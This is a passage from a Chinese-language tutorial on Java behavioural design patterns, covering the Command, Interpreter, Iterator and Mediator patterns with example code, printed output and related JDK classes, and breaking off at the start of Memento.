        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Light is on!"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Light is off!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>/**
 * 遥控器
 */</span>
<span>public</span> <span>class</span> <span>Invoker</span> <span>{</span>
    <span>private</span> <span>Command</span><span>[</span><span>]</span> onCommands<span>;</span>
    <span>private</span> <span>Command</span><span>[</span><span>]</span> offCommands<span>;</span>
    <span>private</span> <span>final</span> <span>int</span> slotNum <span>=</span> <span>7</span><span>;</span>

    <span>public</span> <span>Invoker</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>onCommands <span>=</span> <span>new</span> <span>Command</span><span>[</span>slotNum<span>]</span><span>;</span>
        <span>this</span><span>.</span>offCommands <span>=</span> <span>new</span> <span>Command</span><span>[</span>slotNum<span>]</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setOnCommand</span><span>(</span><span>Command</span> command<span>,</span> <span>int</span> slot<span>)</span> <span>{</span>
        onCommands<span>[</span>slot<span>]</span> <span>=</span> command<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setOffCommand</span><span>(</span><span>Command</span> command<span>,</span> <span>int</span> slot<span>)</span> <span>{</span>
        offCommands<span>[</span>slot<span>]</span> <span>=</span> command<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>onButtonWasPushed</span><span>(</span><span>int</span> slot<span>)</span> <span>{</span>
        onCommands<span>[</span>slot<span>]</span><span>.</span><span>execute</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>offButtonWasPushed</span><span>(</span><span>int</span> slot<span>)</span> <span>{</span>
        offCommands<span>[</span>slot<span>]</span><span>.</span><span>execute</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Invoker</span> invoker <span>=</span> <span>new</span> <span>Invoker</span><span>(</span><span>)</span><span>;</span>
        <span>Light</span> light <span>=</span> <span>new</span> <span>Light</span><span>(</span><span>)</span><span>;</span>
        <span>Command</span> lightOnCommand <span>=</span> <span>new</span> <span>LightOnCommand</span><span>(</span>light<span>)</span><span>;</span>
        <span>Command</span> lightOffCommand <span>=</span> <span>new</span> <span>LightOffCommand</span><span>(</span>light<span>)</span><span>;</span>
        invoker<span>.</span><span>setOnCommand</span><span>(</span>lightOnCommand<span>,</span> <span>0</span><span>)</span><span>;</span>
        invoker<span>.</span><span>setOffCommand</span><span>(</span>lightOffCommand<span>,</span> <span>0</span><span>)</span><span>;</span>
        invoker<span>.</span><span>onButtonWasPushed</span><span>(</span><span>0</span><span>)</span><span>;</span>
        invoker<span>.</span><span>offButtonWasPushed</span><span>(</span><span>0</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h3 id="jdk-6" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Runnable.html" target="_blank" rel="noopener noreferrer">java.lang.Runnable</a></li>
<li><a href="https://github.com/Netflix/Hystrix/wiki" target="_blank" rel="noopener noreferrer">Netflix Hystrix</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/swing/Action.html" target="_blank" rel="noopener noreferrer">javax.swing.Action</a></li>
</ul>
<h2 id="_3-解释器-interpreter" tabindex="-1"> 3. 解释器（Interpreter）</h2>
<h3 id="intent-8" tabindex="-1"> Intent</h3>
<p>为语言创建解释器，通常由语言的语法和语法分析来定义。</p>
<h3 id="class-diagram-8" tabindex="-1"> Class Diagram</h3>
<ul>
<li>TerminalExpression：终结符表达式，每个终结符都需要一个 TerminalExpression。</li>
<li>Context：上下文，包含解释器之外的一些全局信息。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2b125bcd-1b36-43be-9b78-d90b076be549.png"/> </div><br>
<h3 id="implementation-8" tabindex="-1"> Implementation</h3>
<p>以下是一个规则检验器实现，具有 and 和 or 规则，通过规则可以构建一颗解析树，用来检验一个文本是否满足解析树定义的规则。</p>
<p>例如一颗解析树为 D And (A Or (B C))，文本 &quot;D A&quot; 满足该解析树定义的规则。</p>
<p>这里的 Context 指的是 String。</p>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Expression</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>TerminalExpression</span> <span>extends</span> <span>Expression</span> <span>{</span>

    <span>private</span> <span>String</span> literal <span>=</span> <span>null</span><span>;</span>

    <span>public</span> <span>TerminalExpression</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        literal <span>=</span> str<span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        <span>StringTokenizer</span> st <span>=</span> <span>new</span> <span>StringTokenizer</span><span>(</span>str<span>)</span><span>;</span>
        <span>while</span> <span>(</span>st<span>.</span><span>hasMoreTokens</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            <span>String</span> test <span>=</span> st<span>.</span><span>nextToken</span><span>(</span><span>)</span><span>;</span>
            <span>if</span> <span>(</span>test<span>.</span><span>equals</span><span>(</span>literal<span>)</span><span>)</span> <span>{</span>
                <span>return</span> <span>true</span><span>;</span>
            <span>}</span>
        <span>}</span>
        <span>return</span> <span>false</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>AndExpression</span> <span>extends</span> <span>Expression</span> <span>{</span>

    <span>private</span> <span>Expression</span> expression1 <span>=</span> <span>null</span><span>;</span>
    <span>private</span> <span>Expression</span> expression2 <span>=</span> <span>null</span><span>;</span>

    <span>public</span> <span>AndExpression</span><span>(</span><span>Expression</span> expression1<span>,</span> <span>Expression</span> expression2<span>)</span> <span>{</span>
        <span>this</span><span>.</span>expression1 <span>=</span> expression1<span>;</span>
        <span>this</span><span>.</span>expression2 <span>=</span> expression2<span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        <span>return</span> expression1<span>.</span><span>interpret</span><span>(</span>str<span>)</span> <span>&amp;&amp;</span> expression2<span>.</span><span>interpret</span><span>(</span>str<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>OrExpression</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>private</span> <span>Expression</span> expression1 <span>=</span> <span>null</span><span>;</span>
    <span>private</span> <span>Expression</span> expression2 <span>=</span> <span>null</span><span>;</span>

    <span>public</span> <span>OrExpression</span><span>(</span><span>Expression</span> expression1<span>,</span> <span>Expression</span> expression2<span>)</span> <span>{</span>
        <span>this</span><span>.</span>expression1 <span>=</span> expression1<span>;</span>
        <span>this</span><span>.</span>expression2 <span>=</span> expression2<span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        <span>return</span> expression1<span>.</span><span>interpret</span><span>(</span>str<span>)</span> <span>||</span> expression2<span>.</span><span>interpret</span><span>(</span>str<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>/**
     * 构建解析树
     */</span>
    <span>public</span> <span>static</span> <span>Expression</span> <span>buildInterpreterTree</span><span>(</span><span>)</span> <span>{</span>
        <span>// Literal</span>
        <span>Expression</span> terminal1 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"A"</span><span>)</span><span>;</span>
        <span>Expression</span> terminal2 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"B"</span><span>)</span><span>;</span>
        <span>Expression</span> terminal3 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"C"</span><span>)</span><span>;</span>
        <span>Expression</span> terminal4 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"D"</span><span>)</span><span>;</span>
        <span>// B C</span>
        <span>Expression</span> alternation1 <span>=</span> <span>new</span> <span>OrExpression</span><span>(</span>terminal2<span>,</span> terminal3<span>)</span><span>;</span>
        <span>// A Or (B C)</span>
        <span>Expression</span> alternation2 <span>=</span> <span>new</span> <span>OrExpression</span><span>(</span>terminal1<span>,</span> alternation1<span>)</span><span>;</span>
        <span>// D And (A Or (B C))</span>
        <span>return</span> <span>new</span> <span>AndExpression</span><span>(</span>terminal4<span>,</span> alternation2<span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Expression</span> define <span>=</span> <span>buildInterpreterTree</span><span>(</span><span>)</span><span>;</span>
        <span>String</span> context1 <span>=</span> <span>"D A"</span><span>;</span>
        <span>String</span> context2 <span>=</span> <span>"A B"</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>define<span>.</span><span>interpret</span><span>(</span>context1<span>)</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>define<span>.</span><span>interpret</span><span>(</span>context2<span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><div><pre><code>true
false
</code></pre></div><h3 id="jdk-7" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/regex/Pattern.html" target="_blank" rel="noopener noreferrer">java.util.Pattern</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/text/Normalizer.html" target="_blank" rel="noopener noreferrer">java.text.Normalizer</a></li>
<li>All subclasses of <a href="http://docs.oracle.com/javase/8/docs/api/java/text/Format.html" target="_blank" rel="noopener noreferrer">java.text.Format</a></li>
<li><a href="http://docs.oracle.com/javaee/7/api/javax/el/ELResolver.html" target="_blank" rel="noopener noreferrer">javax.el.ELResolver</a></li>
</ul>
<h2 id="_4-迭代器-iterator" tabindex="-1"> 4. 迭代器（Iterator）</h2>
<h3 id="intent-9" tabindex="-1"> Intent</h3>
<p>提供一种顺序访问聚合对象元素的方法，并且不暴露聚合对象的内部表示。</p>
<h3 id="class-diagram-9" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Aggregate 是聚合类，其中 createIterator() 方法可以产生一个 Iterator；</li>
<li>Iterator 主要定义了 hasNext() 和 next() 方法。</li>
<li>Client 组合了 Aggregate，为了迭代遍历 Aggregate，也需要组合 Iterator。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/89292ae1-5f13-44dc-b508-3f035e80bf89.png"/> </div><br>
<h3 id="implementation-9" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Aggregate</span> <span>{</span>
    <span>Iterator</span> <span>createIterator</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteAggregate</span> <span>implements</span> <span>Aggregate</span> <span>{</span>

    <span>private</span> <span>Integer</span><span>[</span><span>]</span> items<span>;</span>

    <span>public</span> <span>ConcreteAggregate</span><span>(</span><span>)</span> <span>{</span>
        items <span>=</span> <span>new</span> <span>Integer</span><span>[</span><span>10</span><span>]</span><span>;</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> items<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            items<span>[</span>i<span>]</span> <span>=</span> i<span>;</span>
        <span>}</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>Iterator</span> <span>createIterator</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteIterator</span><span><span>&lt;</span><span>Integer</span><span>></span></span><span>(</span>items<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>interface</span> <span>Iterator</span><span><span>&lt;</span><span>Item</span><span>></span></span> <span>{</span>

    <span>Item</span> <span>next</span><span>(</span><span>)</span><span>;</span>

    <span>boolean</span> <span>hasNext</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteIterator</span><span><span>&lt;</span><span>Item</span><span>></span></span> <span>implements</span> <span>Iterator</span> <span>{</span>

    <span>private</span> <span>Item</span><span>[</span><span>]</span> items<span>;</span>
    <span>private</span> <span>int</span> position <span>=</span> <span>0</span><span>;</span>

    <span>public</span> <span>ConcreteIterator</span><span>(</span><span>Item</span><span>[</span><span>]</span> items<span>)</span> <span>{</span>
        <span>this</span><span>.</span>items <span>=</span> items<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>Object</span> <span>next</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> items<span>[</span>position<span>++</span><span>]</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>boolean</span> <span>hasNext</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> position <span>&lt;</span> items<span>.</span>length<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Aggregate</span> aggregate <span>=</span> <span>new</span> <span>ConcreteAggregate</span><span>(</span><span>)</span><span>;</span>
        <span>Iterator</span><span><span>&lt;</span><span>Integer</span><span>></span></span> iterator <span>=</span> aggregate<span>.</span><span>createIterator</span><span>(</span><span>)</span><span>;</span>
        <span>while</span> <span>(</span>iterator<span>.</span><span>hasNext</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>iterator<span>.</span><span>next</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h3 id="jdk-8" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Iterator.html" target="_blank" rel="noopener noreferrer">java.util.Iterator</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Enumeration.html" target="_blank" rel="noopener noreferrer">java.util.Enumeration</a></li>
</ul>
<h2 id="_5-中介者-mediator" tabindex="-1"> 5. 中介者（Mediator）</h2>
<h3 id="intent-10" tabindex="-1"> Intent</h3>
<p>集中相关对象之间复杂的沟通和控制方式。</p>
<h3 id="class-diagram-10" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Mediator：中介者，定义一个接口用于与各同事（Colleague）对象通信。</li>
<li>Colleague：同事，相关对象</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/30d6e95c-2e3c-4d32-bf4f-68128a70bc05.png"/> </div><br>
<h3 id="implementation-10" tabindex="-1"> Implementation</h3>
<p>Alarm（闹钟）、CoffeePot（咖啡壶）、Calendar（日历）、Sprinkler（喷头）是一组相关的对象，在某个对象的事件产生时需要去操作其它对象，形成了下面这种依赖结构：</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/82cfda3b-b53b-4c89-9fdb-26dd2db0cd02.jpg"/> </div><br>
<p>使用中介者模式可以将复杂的依赖结构变成星形结构：</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5359cbf5-5a79-4874-9b17-f23c53c2cb80.jpg"/> </div><br>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Colleague</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Alarm</span> <span>extends</span> <span>Colleague</span> <span>{</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"alarm"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doAlarm</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doAlarm()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>CoffeePot</span> <span>extends</span> <span>Colleague</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"coffeePot"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCoffeePot</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doCoffeePot()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Calender</span> <span>extends</span> <span>Colleague</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"calender"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCalender</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doCalender()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Sprinkler</span> <span>extends</span> <span>Colleague</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"sprinkler"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doSprinkler</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doSprinkler()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Mediator</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>void</span> <span>doEvent</span><span>(</span><span>String</span> eventType<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteMediator</span> <span>extends</span> <span>Mediator</span> <span>{</span>
    <span>private</span> <span>Alarm</span> alarm<span>;</span>
    <span>private</span> <span>CoffeePot</span> coffeePot<span>;</span>
    <span>private</span> <span>Calender</span> calender<span>;</span>
    <span>private</span> <span>Sprinkler</span> sprinkler<span>;</span>

    <span>public</span> <span>ConcreteMediator</span><span>(</span><span>Alarm</span> alarm<span>,</span> <span>CoffeePot</span> coffeePot<span>,</span> <span>Calender</span> calender<span>,</span> <span>Sprinkler</span> sprinkler<span>)</span> <span>{</span>
        <span>this</span><span>.</span>alarm <span>=</span> alarm<span>;</span>
        <span>this</span><span>.</span>coffeePot <span>=</span> coffeePot<span>;</span>
        <span>this</span><span>.</span>calender <span>=</span> calender<span>;</span>
        <span>this</span><span>.</span>sprinkler <span>=</span> sprinkler<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>doEvent</span><span>(</span><span>String</span> eventType<span>)</span> <span>{</span>
        <span>switch</span> <span>(</span>eventType<span>)</span> <span>{</span>
            <span>case</span> <span>"alarm"</span><span>:</span>
                <span>doAlarmEvent</span><span>(</span><span>)</span><span>;</span>
                <span>break</span><span>;</span>
            <span>case</span> <span>"coffeePot"</span><span>:</span>
                <span>doCoffeePotEvent</span><span>(</span><span>)</span><span>;</span>
                <span>break</span><span>;</span>
            <span>case</span> <span>"calender"</span><span>:</span>
                <span>doCalenderEvent</span><span>(</span><span>)</span><span>;</span>
                <span>break</span><span>;</span>
            <span>default</span><span>:</span>
                <span>doSprinklerEvent</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doAlarmEvent</span><span>(</span><span>)</span> <span>{</span>
        alarm<span>.</span><span>doAlarm</span><span>(</span><span>)</span><span>;</span>
        coffeePot<span>.</span><span>doCoffeePot</span><span>(</span><span>)</span><span>;</span>
        calender<span>.</span><span>doCalender</span><span>(</span><span>)</span><span>;</span>
        sprinkler<span>.</span><span>doSprinkler</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCoffeePotEvent</span><span>(</span><span>)</span> <span>{</span>
        <span>// ...</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCalenderEvent</span><span>(</span><span>)</span> <span>{</span>
        <span>// ...</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doSprinklerEvent</span><span>(</span><span>)</span> <span>{</span>
        <span>// ...</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Alarm</span> alarm <span>=</span> <span>new</span> <span>Alarm</span><span>(</span><span>)</span><span>;</span>
        <span>CoffeePot</span> coffeePot <span>=</span> <span>new</span> <span>CoffeePot</span><span>(</span><span>)</span><span>;</span>
        <span>Calender</span> calender <span>=</span> <span>new</span> <span>Calender</span><span>(</span><span>)</span><span>;</span>
        <span>Sprinkler</span> sprinkler <span>=</span> <span>new</span> <span>Sprinkler</span><span>(</span><span>)</span><span>;</span>
        <span>Mediator</span> mediator <span>=</span> <span>new</span> <span>ConcreteMediator</span><span>(</span>alarm<span>,</span> coffeePot<span>,</span> calender<span>,</span> sprinkler<span>)</span><span>;</span>
        <span>// 闹钟事件到达，调用中介者就可以操作相关对象</span>
        alarm<span>.</span><span>onEvent</span><span>(</span>mediator<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>doAlarm</span><span>(</span><span>)</span>
<span>doCoffeePot</span><span>(</span><span>)</span>
<span>doCalender</span><span>(</span><span>)</span>
<span>doSprinkler</span><span>(</span><span>)</span>
</code></pre></div><h3 id="jdk-9" tabindex="-1"> JDK</h3>
<ul>
<li>All scheduleXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/Timer.html" target="_blank" rel="noopener noreferrer">java.util.Timer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/Executor.html#execute-java.lang.Runnable-" target="_blank" rel="noopener noreferrer">java.util.concurrent.Executor#execute()</a></li>
<li>submit() and invokeXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ExecutorService.html" target="_blank" rel="noopener noreferrer">java.util.concurrent.ExecutorService</a></li>
<li>scheduleXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ScheduledExecutorService.html" target="_blank" rel="noopener noreferrer">java.util.concurrent.ScheduledExecutorService</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html#invoke-java.lang.Object-java.lang.Object...-" target="_blank" rel="noopener noreferrer">java.lang.reflect.Method#invoke()</a></li>
</ul>
<h2 id="_6-备忘录-memento" tabindex="-1"> 6. 备忘录（Memento）</h2>
<h3 id="intent-11" tabindex="-1"> Intent</h3>
<p>在不违反封装的情况下获得对象的内部状态，从而在需要时可以将对象恢复到最初状态。</p>
<h3 id="class-diagram-11" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Originator：原始对象</li>
<li>Caretaker：负责保存好备忘录</li>
<li>Menento：备忘录，存储原始对象的的状态。备忘录实际上有两个接口，一个是提供给 Caretaker 的窄接口：它只能将备忘录传递给其它对象；一个是提供给 Originator 的宽接口，允许它访问到先前状态所需的所有数据。理想情况是只允许 Originator 访问本备忘录的内部状态。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/50678f34-694f-45a4-91c6-34d985c83fee.png"/> </div><br>
<h3 id="implementation-11" tabindex="-1"> Implementation</h3>
